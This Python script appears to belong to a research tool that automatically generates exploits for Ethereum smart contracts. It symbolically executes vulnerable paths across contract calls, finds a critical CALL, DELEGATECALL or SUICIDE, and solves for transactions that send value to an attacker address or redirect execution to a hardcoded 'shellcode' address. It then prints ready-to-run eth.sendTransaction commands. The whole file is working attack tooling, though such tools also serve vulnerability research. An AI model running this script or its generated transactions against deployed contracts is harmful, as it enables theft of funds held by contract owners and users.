#!/usr/bin/env python2.7
from binascii import hexlify
from copy import copy
from combined_call_exploit import attempt_exploit_new_call, attempt_exploit_other_three, addr_to_project
from ethanalyze.evm import CombinedSymbolicResult, SymbolicEVMState
from ethanalyze.project import Project
from z3 import z3

INTERESTING_INS = ('CALL', 'CALLCODE', 'DELEGATECALL', 'SUICIDE', 'RETURN', 'STOP')

if __name__ == '__main__':
    import sys
    import json

    critical_op = None
    critical_addr = None
    critical_amount = None

    if len(sys.argv) < 5:
        print >> sys.stderr, "Usage: %s <project.json> <exploit.json> <target-addr> <target-amount>" % sys.argv[0]
        sys.exit(-1)
    #unpack target contract project
    with open(sys.argv[1]) as f:
        project_dict = json.load(f)

    project = Project.from_json(project_dict)
    # unpack target contract exploit
    with open(sys.argv[2]) as f:
        exploit_dict = json.load(f)

    combined = CombinedSymbolicResult()


    path_objects = []
    for path_dict in sorted(exploit_dict['paths'], key=lambda x: x['index'], reverse=False):
        # extend buggy paths...
        path = path_dict['path']
        if(path_dict['addres'] != 0): #it's not the target contract! need to get a new project
            current_project = addr_to_project(path_dict['addres'])
        else:
            current_project = project
        last_ins = current_project.prg[path[-1]]
        bb = last_ins.bb
        idx = bb.ins.index(last_ins)
        for ins in bb.ins[idx:]:
            if ins.name in INTERESTING_INS:
                break
        # does this have anything to do with the critical_addR?
        if ins.addr != path[-1]:
            path.append(ins.addr)

        path_objects.append((path_dict['xid'], path, path_dict['addres'], path_dict['spec']))

    one_time_token = True
    # for i, j, k in zip(paths[0::3], paths[1::3], paths[2::3]):  # all in triples BESIDES the last triple; which is our vuln
    while path_objects:
        # if (k != None): #this will be the head
        #first one to pop is k head; then j callee, lastly i as tail
        k = path_objects.pop()
        head_r = project.run_symbolic(k[1], term_on_interCall=True)
        triple_r = [head_r, None, None]
        head_r.project = project
        if(path_objects):
            if (k[0] == path_objects[-1][0] and path_objects[-1][2] != 0):  # if current head xid matches the next element xid -> callee AND the contract_addr field is not
                # zero
                j = path_objects.pop()
                callee_p = addr_to_project(j[2]) #the callees address is in j[2]!
                adjusted_head_r_state = SymbolicEVMState(xid=head_r.xid, code=callee_p.code)

                adjusted_head_r_state.storage = copy(head_r.state.storage)

                adjusted_head_r_state.callee_addr = 1
                adjusted_head_r_state.call_args = head_r.state.call_args
                # callcode overwrite of CALLER
                # try:
                #     adjusted_head_r_state.old_caller = head_r.state.old_caller
                # except AttributeError:
                #     pass  # no such variable found
                adjusted_head_r_state.input_value = head_r.state.input_value

                # adjusted_head_r_state.callee_addr = 1
                # if it's a vuln PART - then callee exec should NOT be inclusive becasue we want the critical ops from stack
                callee_r = callee_p.run_symbolic(j[1], inclusive=False if (one_time_token and j[3] == 'PART') else True , state=adjusted_head_r_state)
                callee_r.project = callee_p

                if (path_objects):
                    if (j[0] == path_objects[-1][0] and path_objects[-1][2] == 0):  ## if current head xid matches the next element xid tail
                        i = path_objects.pop()
                        #sanity test; addr of head and tial should match!
                        if(j[0] != i[0]):
                            break

                        adjusted_state_for_tail = copy(head_r.state)
                        # need to revert stack to the state before we can callee
                        adjusted_state_for_tail.stack = copy(head_r.state.stack)

                        adjusted_state_for_tail.pc += 1
                        adjusted_state_for_tail.stack.append(1)

                        adjusted_state_for_tail.callee_addr = head_r.state.callee_addr
                        adjusted_state_for_tail.call_args = head_r.state.call_args

                        adjusted_state_for_tail.storage = copy(callee_r.state.storage)

                        adjusted_state_for_tail.return_value = callee_r.state.return_value

                        #we dont use the path from the JSON, rather we reuse the left_path from head like in the FULL/PART exec
                        #nontheless - we check that the paths match as sanitycheck
                        if (k[1] != i[1]):
                            break

                        tail_r = project.run_symbolic(head_r.path_left, state=adjusted_state_for_tail)
                        tail_r.project = project

                        triple_r[2] = tail_r

                triple_r[1] = callee_r

        combined.disjoint_prepend(triple_r)

        if(one_time_token):# check to find crit elements
            for result in triple_r:
                if (result != None):
                    if hasattr(result.state, 'critical_op'):
                        critical_op = result.state.critical_op
                        critical_addr = result.state.critical_addr
                        if (critical_op == 'CALL'):
                            critical_amount = result.state.critical_amount
            one_time_token = False


    #add init_storage if present
    initial_storage = dict()
    if len(sys.argv)>5:
        with open(sys.argv[5], 'rb') as f:
            initial_storage = {int(k,16):int(v,16) for k,v in json.load(f).iteritems() if int(v, 16) != 0}
    # add init_balance if present
    initial_balance = None
    if len(sys.argv)>6:
        initial_balance = int(sys.argv[6])

    # combined._combine(initial_storage, initial_balance)
    # critical_op = exploit_dict['critical']['op']
    # critical_addr = critical['addr']
    # critical_amount = exploit_dict['critical']['amount']
    combined._combine(initial_storage, initial_balance, critical_addr=critical_addr, critical_op=critical_op)
    combined.simplify()

    # vuln_ins = p.prg[combined.state.pc] #!!!

    target_addr = int(sys.argv[3].strip(), 16)
    shellcode_addr = 0x3debc0a74cb1ed48d4282b859e91006c00808d91

    result = None

    #fix for .only_complex that I added in combined.py to search only for non-trivial exploits
    #Becasue this is just redoing the path generation, I don't need to differentiate anymore on "complex"
    #so I can simply set it to false to avoid bumping into AttributeError: 'CombinedSymbolicResult' object has no attribute 'only_complex'
    try:
        combined.only_complex
    except AttributeError:
        combined.only_complex = False

    if critical_op == 'CALL':
        amount = sys.argv[4].strip()
        amount_check = '+'
        if amount[0] in ('=', '+', '-'):
            amount_check = amount[0]
            amount = amount[1:]
        amount = int(amount)
        result = attempt_exploit_new_call(combined, target_addr, critical_amount, amount, amount_check, initial_balance)
    elif (critical_op == 'CALLCODE') or (critical_op == 'DELEGATECALL'):
        result = attempt_exploit_other_three(combined, shellcode_addr)
    elif (critical_op == 'SUICIDE'):
        result = attempt_exploit_other_three(combined, shellcode_addr)
    else:  # someting is wrong in crit_op!
        print critical_op

    if result:
        call, r, model = result

        print model
        print '\n'.join(x.name() for x in model.decls())

        for i, res in enumerate(r.results):
            if( res != None):
                print '%d: %s' % (
                i, '->'.join('%x' % i for i in res.state.trace if i in res.project.cfg.bb_addrs or i == res.state.trace[-1]))
        print call
        print
        for c in call:
            if c['caller'] == 0x3debc0a74cb1ed48d4282b859e91006c00808d91:
                target_addr = '0x3debc0a74cb1ed48d4282b859e91006c00808d91'

            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"%s, gas:500000, gasPrice:0})' % (
            target_addr, hexlify(c.get('payload', '')), ", value:%d" % c['value'] if c.get('value', 0) else '')
            # print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"%s, gas:500000})' % (
            #     target_addr, hexlify(c.get('payload', '')), ", value:%d" % c['value'] if c.get('value', 0) else '')
